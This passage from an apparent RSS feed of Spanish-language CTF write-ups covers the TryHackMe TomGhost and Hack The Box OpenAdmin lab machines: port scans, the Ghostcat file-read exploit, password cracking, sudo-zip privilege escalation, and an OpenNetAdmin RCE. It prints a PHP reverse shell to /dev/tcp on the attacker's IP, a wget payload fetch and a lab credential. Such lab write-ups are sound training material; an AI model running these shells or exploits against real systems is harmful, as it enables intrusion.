&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/nax/Screenshot%20from%202020-05-05%2000.57.08.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/nax/Screenshot%20from%202020-05-05%2000.58.17.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/nax/Screenshot%20from%202020-05-05%2000.58.55.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/nax/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/nax/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - TomGhost</title>
        <link>https://sckull.github.io/posts/tomgost/</link>
        <pubDate>Tue, 05 May 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Tue, 05 May 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/tomgost/</guid>
        <description>TomGhost es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;TomGhost es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/tomghost/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;Tomghost&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;Identify recent vulnerabilities to try exploit the system or read files that you should not have access to.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;810&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/stuxnet&#34;&gt;stuxnet&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto http (8080), ajp13 (8009) y el puerto ssh (22) abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Mon May  4 21:55:03 2020 as: nmap -sV -o nmap_scan_mini tomgost.thm&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; tomgost.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.190.132&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.22s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;996&lt;/span&gt; closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Protocol v1.3&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
8080/tcp open  http       Apache Tomcat 9.0.30
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Mon May  4 21:55:31 2020 -- 1 IP address (1 host up) scanned in 28.22 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/tomghost# gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://tomgost.thm:8080/ -q -t &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; -x php,html,txt
/docs &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 302&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/examples &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 302&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/favicon.ico &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/host-manager &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 302&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/manager &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 302&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
root@upset:~/thm/tomghost#
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;http-puerto-8080&#34;&gt;HTTP Puerto 8080&lt;/h3&gt;
&lt;p&gt;Encontramos Apache Tompact en el puerto 8080.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/tomghost/Screenshot%20from%202020-05-04%2021.23.42.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;ajp-ghostcat-file-readinclusion---puerto-8009&#34;&gt;AJP &amp;lsquo;Ghostcat File Read/Inclusion&amp;rsquo; - Puerto 8009&lt;/h2&gt;
&lt;p&gt;Para el servicio en el puerto 8009 (Apache Jserv) encontramos un exploit que permite lectura de archivos, utilizamos el exploit  &lt;a href=&#34;https://www.exploit-db.com/exploits/48143&#34;&gt;&lt;strong&gt;CVE-2020-1938&lt;/strong&gt;&lt;/a&gt;. Intentamos leer el archivo &lt;code&gt;index.jsp&lt;/code&gt; y logramos obtener el codigo fuente.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/tomghost/Screenshot%20from%202020-05-04%2021.48.46.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ya que logramos obtener el codigo fuente de &lt;code&gt;index.jsp&lt;/code&gt;, intentamos obtener el archivo de configuracion &lt;code&gt;web.xml&lt;/code&gt;, logramos obtener el codigo fuente y logramos ver lo que parecen credenciales.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/tomghost/Screenshot%20from%202020-05-04%2021.51.47.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;user---skyfuck&#34;&gt;USER - SKYFUCK&lt;/h2&gt;
&lt;p&gt;Intentamos ingresar en el panel de tomcat (&lt;code&gt;/manager/html&lt;/code&gt;) pero no esta autorizado el acceso. Utilizamos el servicio SSH con las credenciales encontradas y logramos obtener una shell.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/tomghost/Screenshot%20from%202020-05-04%2021.55.26.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Dentro de la carpeta principal de Skyfuck encontramos dos arhivos una clave y un archivo encriptado, intentamos importar la key y desencriptar el archivo gpg pero al parecer la clave esta protegida por una frase.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/tomghost/Screenshot%20from%202020-05-04%2022.00.58.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos &lt;strong&gt;gpg2john&lt;/strong&gt; para generar el hash y utilizar john para encontrar la frase.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/tomghost/Screenshot%20from%202020-05-04%2022.06.12.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Una vez encontrada la frase utilizamos esta para desencriptar el archivo &lt;code&gt;credentials.gpg&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/tomghost/Screenshot%20from%202020-05-04%2022.07.37.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;user---merlin&#34;&gt;USER - MERLIN&lt;/h2&gt;
&lt;p&gt;Utilizamos las credenciales encontradas y obtenemos una shell con el usuario merlin y nuestra flag &lt;strong&gt;user.txt&lt;/strong&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/tomghost/Screenshot%20from%202020-05-04%2022.09.14.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Hacemos una pequeña enumeracion con &lt;code&gt;sudo -l -l&lt;/code&gt; y vemos que tenemos permisos root (sudo) para ejecutar el comando &lt;code&gt;zip&lt;/code&gt;. Utilizamos &lt;a href=&#34;https://gtfobins.github.io/gtfobins/zip/&#34;&gt;&lt;strong&gt;zip&lt;/strong&gt;&lt;/a&gt; para obtener una shell root.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/tomghost/Screenshot%20from%202020-05-04%2022.12.06.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Logramos obtener una shell con usuario root y nuestra flag &lt;strong&gt;root.txt&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/tomghost/Screenshot%20from%202020-05-04%2022.12.47.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/tomghost/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/tomghost/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>Hack The Box - OpenAdmin</title>
        <link>https://sckull.github.io/posts/openadmin/</link>
        <pubDate>Sat, 02 May 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 02 May 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/openadmin/</guid>
        <description>OpenAdmin es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;OpenAdmin es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/openadmin/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th&gt;OpenAdmin&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;OS&lt;/td&gt;
&lt;td&gt;Linux&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;20&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;IP&lt;/td&gt;
&lt;td&gt;10.10.10.171&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/82600&#34;&gt;dmw0ng&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;masscan--nmap&#34;&gt;MASSCAN &amp;amp; NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp y servicios con masscan y nmap.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Starting masscan 1.0.5 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;http://bit.ly/14GZzcT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2020-01-08 05:54:56 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hosts &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;131070&lt;/span&gt; ports/host&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Discovered open port 22/tcp on 10.10.10.171 
Discovered open port 80/tcp on 10.10.10.171

&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Tue Jan  7 23:51:39 2020 as: nmap -p- --min-rate 1000 -sV -sC -o nmap_scan 10.10.10.171&lt;/span&gt;
Warning: 10.10.10.171 giving up on port because retransmission cap hit &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.171
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.15s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;65528&lt;/span&gt; closed ports
PORT      STATE    SERVICE    VERSION
22/tcp    open     tcpwrapped
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; dc:eb:3d:c9:44:d1:18:b1:22:b4:cf🇩🇪bd:6c:7a:54 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp    open     http       Apache httpd 2.4.29 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.29 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Apache2 Ubuntu Default Page: It works
16874/tcp filtered unknown
31545/tcp filtered unknown
40838/tcp filtered unknown
42307/tcp filtered unknown
47055/tcp filtered unknown

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Tue Jan  7 23:53:43 2020 -- 1 IP address (1 host up) scanned in 123.98 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Pagina por default de Apache.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/openadmin/Screenshot_2020-01-08_00-02-04.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;gobuster---http&#34;&gt;GOBUSTER - HTTP&lt;/h3&gt;
&lt;p&gt;Busqueda de directorios y archivos con gobuster.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/htb/openadmin# gobuster dir -u http://10.10.10.171 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t &lt;span class=&#34;m&#34;&gt;115&lt;/span&gt; -x php,html,txt -q
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/music &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/artwork &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/sierra &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/marga &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;music&#34;&gt;/music&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/openadmin/Screenshot_2020-01-08_19-37-40.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;sierra&#34;&gt;/sierra&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/openadmin/Screenshot_2020-01-08_19-38-03.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;marga&#34;&gt;/marga&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/openadmin/Screenshot_2020-01-08_19-38-47.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;artwork&#34;&gt;/artwork&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/openadmin/Screenshot_2020-01-08_19-39-21.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;opennetadmin-1811---remote-code-execution&#34;&gt;OpenNetAdmin 18.1.1 - Remote Code Execution &lt;/h2&gt;
&lt;p&gt;En la pagina de &lt;code&gt;/music&lt;/code&gt; encontramos que la pagina login nos redirige hacia otra pagina diferente (/ona), en la cual esta corriendo el gestor OpenNetAdmin en su version &lt;code&gt;18.1.1&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/openadmin/Screenshot_2020-01-08_19-41-27.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Este gestor tiene una vulnerabilidad del tipo RCE y encontramos un exploit (&lt;a href=&#34;https://www.exploit-db.com/exploits/47691&#34;&gt;&lt;strong&gt;OpenNetAdmi - ExploitDB&lt;/strong&gt;&lt;/a&gt; ) que aprovecha esta vulnerabilidad, ejecutamos dicho exploit pasandole la url como parametro.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/openadmin/Screenshot_2020-01-08_19-46-01.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;user---jimmy&#34;&gt;USER - Jimmy&lt;/h2&gt;
&lt;p&gt;Ahora que podemos ejecutar comandos vamos a actualizar nuestra shell a una shell inversa utilizando PHP, descargando el archivo y abriendolo en el navegador para ejecutarlo.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/bin/bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.15.72/1227 0&amp;gt;&amp;amp;1&amp;#39;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Descargamos en la maquina:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;wget 10.10.15.72/sc.php
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Obtenemos nuestra shell inversa:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/openadmin/Screenshot_2020-01-08_19-48-48.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Entre los archivos de configuracion de la base de datos de OpenNetAdmin encontramos las credenciales para acceder a la base de datos, utilizamos la contraseña para obtener una shell con el usuario Jimmy.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/openadmin/Screenshot_2020-01-08_19-50-42.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Jimmy:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/openadmin/Screenshot_2020-01-08_19-51-24.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Credenciales:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;jimmy:n1nj4W4rri0R!
